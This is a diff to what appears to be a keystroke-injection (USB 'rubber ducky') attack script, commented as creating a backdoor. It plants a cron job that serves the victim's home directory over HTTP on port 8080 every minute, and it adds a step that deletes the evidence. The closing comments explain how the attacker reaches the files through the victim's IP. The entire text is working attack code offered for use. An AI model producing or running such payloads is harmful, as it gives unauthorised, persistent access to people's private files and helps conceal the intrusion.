@@ -7,13 +7,12 @@ DEFAULT_DELAY 400
 ALT t
 
 REM Create backdoor
-STRING echo "* * * * * cd ~ && python3 -m http.server 8000" > cron
-ENTER
-STRING crontab -i cron
-ENTER
+STRINGLN echo "* * * * * cd ~ && python3 -m http.server 8080" > cron
+STRINGLN crontab -i cron
 
-REM Close window to run stealthily
-ALT F4
+REM Clean up
+STRINGLN rm cron
+REM ALT F4
 
 REM You can now interact with this by navigating to http://[Victim IP]:8080 in a browser
 REM or curl [Victim IP]:8080
